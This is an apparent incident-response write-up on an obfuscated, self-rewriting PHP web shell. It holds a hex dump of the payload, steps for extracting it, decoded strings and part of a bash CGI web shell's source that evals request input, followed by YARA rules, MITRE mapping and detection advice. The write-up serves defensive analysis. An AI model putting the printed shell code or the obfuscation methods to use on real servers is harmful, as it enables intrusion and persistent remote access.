00000050: 037c 047c 0327 2c20 677a 696e 666c 6174  .|.|.', gzinflat
00000060: 6528 7375 6273 7472 2827 1fc2 8b08 0000  e(substr('......
00000070: 0000 0000 0ac3 94c3 bdc3 a9c2 96c3 9b38  ...............8
00000080: c392 300c 7ec3 a77c c3b3 c2a7 c3ab c29c  ..0.~..|........
00000090: c3a7 1e58 595d c29d 76c3 8bc2 99c3 9cc2  ...XY]..v.......
000000a0: b4c3 9a65 7773 c293 44c3 ad12 c2b5 c297  ...ews..D.......
000000b0: c3ab 7573 1349 c289 c29b c2b8 c288 c292  ..us.I..........
000000c0: c2aa c3bb c3af c39c c390 c39c c391 5c5c  ..............\\
000000d0: c389 005c 5c24 4ac2 a94c c2a7 6bc3 a9c3  ...\\$J..L..k...

Ok so now we know the following: - First 10 bytes and the last -8 bytes must be stripped off to carve out the actual payload. - As a side note, the fact that the first bytes is 0a (10 in hex, is purely coincidental to my knowledge) - The weird obfuscated variable is used as the array which holds the sub array of global variables - From what we have seen previously, there are must be code or some important values attached to each hex value referenced in the GLOBALS array - Each value is delimited by the pipe and control characters

Now we should know enough to be able to try and extract the values from the compressed payload.

I had Gemini help me with the extraction portion here as I faced some issues with the compressed data. This is how it was finally extracted: - Find the offset in the payload where the gzip magic header is (1F 8B 08) - Unescape the single and double quotes in the raw payload - Decompress the payload with GZIP streaming - Looked for one of two different delimiters (this is because the scripts didn't always use the same delimiters) - "|\x03|\x04|\x03" (with pipes) - "\x03\x04\x03" (without pipes) - Split each string at the delimiter and output to a file

So we can see a ton of different regex patterns, paths, urls and some other encoded entries. Some of the most interesting are these three: - 0x2cd - 0x2d7 - 0x2e2 These are base64 encoded C and Perl bind and reverse shell code. One of the bind shells even expects a password between 1-29 characters long. According the the dictionary, the bound it to port 31337.... cute bro.

Ok that's great, but my next question was "what does this script actually execute?". At this point I gave Gemini both the spaghetti code and the decoded dictionary to find out what is executing in this script.

docs.title: Code Execution - The Web Shell
docs.text:
Keep in mind that the spaghetti code I show in the code block above is truncated so there are values mentioned below which you won't see in the code above.

First the attacker authenticates themselves with an obfuscated cookie: 

<?php
setcookie($UCZQU,$rQn2c);
$_COOKIE[md5($_SERVER[$GLOBALS[0x085]])]
When we look at the dictionary, the value at 0x085 is HTTP_HOST: 
[0x085] -> HTTP_HOST

// the cookie then becomes something similar to: 
$resultant_cookie = 'f0fdb4c3f58e3e3f8e77162d893d3055';

We can see that the attackers are looking for some Joomla reminants, if someone knows why I would love to know. It is possible that this could reveal some configuration or possible WAF but I am not sure as this server didn't have any of that in the databases. 

[0x004] -> SELECT * FROM `
[0x005] -> ` WHERE `element`='com_akeeba'

We see cross-account server and DNS enumeration, to find all the sites on the shared host: 

[0x001] -> /etc/named.conf
[0x00d] -> /etc/valiases/
[0x015] -> #named/(.*?).db#
By reading all the DNS zones, the script generates a list of every single domain on the server. Gemini suggested that this could be used to try and jump accounts via symlinks, but I had already found evidence to that earlier in the .F0x directory. Attacker Base Directory

The script also dynamically renders a GUI with check boxes that give access to different commands: 

[0x7f8] -> ><td><input type=checkbox name="f[]" value="
[0x801] -> ','chmod')">
[0x803] -> ', 'rename')">R</a> 
[0x804] -> ', 'touch')">T</a>
[0x805] -> ', 'frame')">F</a>

We can see a small php upload script and some of the randomly name directories they used. I found many similar directories and many index.php files that were malicious.

They also drop a custom .htaccess file and create themselves a nice little website. This gives them the ability to list directories, bypass security settings set on the website, and read any source code of php files!

[0x2c0] -> root.pl

But when doing a quick search on the server for .pl files, I found some CGI Webshells in .pl files that are actually bash: 
#!/bin/bash -i

#
password="123"


function cgi_get_POST_vars()
{
    # check content type
    [ "${CONTENT_TYPE}" != "application/x-www-form-urlencoded" ] && \
        echo "Warning: you should probably use MIME type "\
             "application/x-www-form-urlencoded!" 1>&2
    # save POST variables (only first time this is called)
    [ -z "$QUERY_STRING_POST" \
      -a "$REQUEST_METHOD" = "POST" -a ! -z "$CONTENT_LENGTH" ] && \
        read -n $CONTENT_LENGTH QUERY_STRING_POST
    return
}


function cgi_decodevar()
{
    [ $# -ne 1 ] && return
    local v t h

    t="${1//+/ }%%"
    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
        v="${v}${t%%\%*}"
        t="${t#*%}"

        if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
            h=${t:0:2}
            t="${t:2}"
            v="${v}"`echo -e \\\\x${h}`
        fi
    done

    echo "${v}"
    return
}

function cgi_getvars()
{
    [ $# -lt 2 ] && return
    local q p k v s
    # get query
    case $1 in
        GET)
            [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
            ;;
        POST)
            cgi_get_POST_vars
            [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
            ;;
        BOTH)
            [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
            cgi_get_POST_vars
            [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
            ;;
    esac
    shift
    s=" $* "
    # parse the query data
    while [ ! -z "$q" ]; do
        p="${q%%&*}"  # get first part of query string
        k="${p%%=*}"  # get the key (variable name) from it
        v="${p#*=}"   # get the value from it
        q="${q#$p&*}" # strip first part from query string
        # decode and evaluate var if requested
        [ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
            eval "$k=\"`cgi_decodevar \"$v\"`\""
    done
    return
}
# register all GET and POST variables
cgi_getvars BOTH ALL

docs.title: Polymorphism Mechanism
docs.text:
On each successful request the shell:

  1. Generates new 8-byte key via md5(mt_rand())
  2. Re-encrypts its own full source with new key
  3. Calls file_put_contents(__FILE__, ...) to overwrite itself

Result: file hash changes on every execution. Static hash IOCs become stale after first trigger.

docs.title: MITRE ATT&CK Mapping
docs.text: Tactic Technique ID Technique Name Notes Persistence T1505.003 Server Software Component: Web Shell Primary persistence mechanism Defense Evasion T1027 Obfuscated Files or Information Multi-layer gz/b64/rot13/strrev chains with randomised variable names Defense Evasion T1140 Deobfuscate/Decode Files or Information Runtime eval() chain decodes payload layer by layer Execution T1059.004 Unix Shell Commands executed via eval() and bound/reverse shell payloads Credential Access T1552.001 Credentials In Files Regex patterns harvest DB credentials from wp-config.php and CMS config files Discovery T1018 Remote System Discovery /etc/named.conf and DNS zone enumeration maps every domain on the shared host Command and Control T1219 Remote Access Software GSocket RAT binary dropped for persistent remote access Command and Control T1105 Ingress Tool Transfer GSocket RAT binary transferred to compromised host

docs.title: Indicators of Compromise
docs.text:
Detection Note

Hash-based IOCs are unreliable — the polymorphic self-rewrite changes the file hash on every execution. Prioritize the YARA rule and behavioral detections below.

docs.title: YARA Rules
docs.text:
rule Detect_AnonFoxPHP {
    meta:
        description = "PHP Compressed Anon Fox Payload"
        author = "8iker_4n0n"
        severity = "Critical"
        reference_pattern = "( __FILE__ ),-[0-9]+"

    strings:
        $pattern = /\( *__FILE__ *\),-[0-9]+/ ascii
        $zlib1 = { 78 01 }
        $zlib2 = { 78 9C }
        $zlib3 = { 78 DA }

    condition:
        uint8(0) == 0x3C and uint8(1) == 0x3F and
        $pattern and 
        $zlib1 in (@pattern..@pattern + 1000) or
        $zlib2 in (@pattern..@pattern + 1000) or
        $zlib3 in (@pattern..@pattern + 1000)
}

rule AnonymousFox_PHP_Webshell {
    meta:
        description = "Detects Anonymous Fox polymorphic PHP web shell family"
        author      = "8iker_4n0n"
        date        = "2026-06-27"
    strings:
        $self_ref     = /\(\s*__FILE__\s*\),\s*-[0-9]+/ ascii
        $str_corrupt  = /str_replace\('[a-z]{10}','[<>]'/ ascii
        $disable_log  = "ini_set('error_log', NULL)" ascii
        $gz_chain     = /gzu(ncompress|inflate)\s*\(/ ascii
        $error_off    = "error_reporting(0)" ascii
    condition:
        $self_ref and $str_corrupt and 2 of ($disable_log, $gz_chain, $error_off)
}

rule Detect_ObfuscatedCode {
    meta:
        author      = "8iker_4n0n"
        description = "Find common concatenation obfuscated code"
    strings:
        $pattern = /\$[A-Za-z0-9_]{1,32}\s*=\s*('[A-Za-z0-9_]+'\s*\.\s*){1,}'[A-Za-z0-9_]+'\s*/ ascii
    condition:
        $pattern
}

rule Detect_GSocket_Webshell {
    meta:
        author      = "8iker_4n0n"
        description = "Detect possible GSocket Webshell"
        severity = "Critical"
    strings:
        $pattern = "/usr/bin/pkill -0" base64
    condition:
        $pattern
}

rule Detect_UShortLinks {
        meta:
                author = "8iker_4n0n"
                description = "Find Ushort links in files"
        strings:
                $pattern = /ushort\.[a-z]+/ nocase

                $php1 = "<?php" nocase
                $php2 = "<?="

                $html1 = "<html" nocase
                $html2 = "<body" nocase
                $html3 = "<!DOCTYPE" nocase

        condition:
                (any of ($php*) or any of ($html*)) and $pattern
}

docs.title: Detection Recommendations
docs.text:
• File integrity monitoring: Alert on web root files modifying themselves (inotifywait or AIDE with short polling interval)
  • Web server logs: Alert on POST requests to files in image/asset directories
  • Static analysis: YARA rule in the Indicators of Compromise section catches the structural pattern regardless of key rotation
  • Behavioral: Block file_put_contents calls referencing __FILE__ via PHP disable_functions in production

docs.title: Security Research Site — Design Spec
docs.text: Date: 2026-06-27 Author: 8iker_4n0n Status: Approved

docs.title: Overview
docs.text:
Public MkDocs-based security research site hosted on GitHub Pages. Handle: 8iker_4n0n. Stack: MkDocs 1.6.1 + Material 9.6 (already installed in python_env).

Content types: IR reports, malware/sample analysis, CVE writeups, tool releases. Organized by type, not date. Tools section links out to GitHub repos rather than embedding code.

docs.title: Site Structure
docs.text:
docs/
├── index.md                  # landing page / about
├── tags.md                   # auto-generated by tags plugin
├── ir-reports/
│   ├── index.md              # section overview
│   └── 2026-06-27-polymorphic-webshell.md
├── malware-analysis/
│   └── index.md
├── cve-writeups/
│   └── index.md
└── tools/
    └── index.md              # curated tool cards + GitHub links

Deploy: mkdocs gh-deploy pushes built site to gh-pages branch on GitHub. Source lives on main.

docs.title: Frontmatter Template
docs.text:
Every report (IR, malware, CVE) uses this YAML frontmatter:

---
title: "Report Title"
date: YYYY-MM-DD
author: 8iker_4n0n
category: ir-report        # ir-report | malware | cve
severity: high             # critical | high | medium | low
mitre_tags:
  - T1505.003
  - T1027
ioc_summary:
  - "SHA256: abc123..."
  - "URL: http://..."
  - "IP: 1.2.3.4"
tags:
  - webshell
  - polymorphic
  - T1505.003
---

tags field powers Material's tags plugin — readers click a tag and see all reports sharing it. MITRE IDs appear in both mitre_tags (structured data) and tags (filterable index).

docs.title: Report Body Structure
docs.text:
Convention (not enforced by tooling) — every report follows this section order:

Section Purpose ## Overview What happened, when, impact ## Timeline Chronological key events ## Technical Analysis Code, screenshots, behavior breakdown ## MITRE ATT&CK Mapping Table: Tactic / Technique ID / Name / Notes ## Indicators of Compromise Collapsible blocks per IOC type ## Remediation Actions taken / recommended ## References CVEs, vendor advisories, external links

Use !!! danger "IOCs" admonition for high-visibility callouts. Use collapsible ??? "Hash list" blocks for long IOC lists to keep pages scannable.
